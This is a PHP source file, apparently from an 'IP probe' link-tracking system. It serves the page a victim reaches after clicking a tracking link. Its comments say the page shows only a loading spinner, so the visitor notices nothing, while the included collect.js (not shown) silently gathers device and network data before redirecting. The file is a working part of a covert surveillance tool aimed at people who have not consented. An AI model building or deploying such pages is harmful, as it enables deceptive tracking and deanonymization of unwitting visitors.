<?php
/**
 * IP 探针系统 — 采集端页面
 *
 * 用户点击采集链接后访问此页面，页面极简（仅 loading 动画），
 * 加载 collect.js 静默采集设备/网络信息后自动跳转到预设页面。
 */

require_once __DIR__ . '/config.php';
require_once __DIR__ . '/includes/storage.php';
require_once __DIR__ . '/includes/database.php';
require_once __DIR__ . '/includes/links.php';

$id = $_GET['id'] ?? '';
if (empty($id)) {
    http_response_code(404);
    exit('链接无效');
}

$link = get_link($id);
if (!$link) {
    http_response_code(404);
    exit('链接不存在或已被删除');
}
?>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="referrer" content="no-referrer">
    <title>Loading...</title>
    <style>
        /* 极简采集页面样式 — 全程无感知 */
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            background: #fff;
            font-family: -apple-system, BlinkMacSystemFont, "PingFang SC", sans-serif;
        }
        .spinner {
            width: 24px;
            height: 24px;
            border: 2.5px solid #e5e5ea;
            border-top-color: #007AFF;
            border-radius: 50%;
            animation: spin 0.6s linear infinite;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="spinner"></div>
    <script>window.LINK_ID = '<?php echo htmlspecialchars($id, ENT_QUOTES, 'UTF-8'); ?>';</script>
    <script>window.SITE_URL = '<?php
        $proto = (!empty($_SERVER["HTTPS"]) && $_SERVER["HTTPS"] !== "off") ? "https" : "http";
        $host  = $_SERVER["HTTP_HOST"] ?? "localhost";
        $basePath = rtrim(dirname($_SERVER["SCRIPT_NAME"]), "/\\");
        echo $proto . "://" . $host . $basePath;
    ?>';</script>
    <script src="assets/collect.js"></script>
</body>
</html>
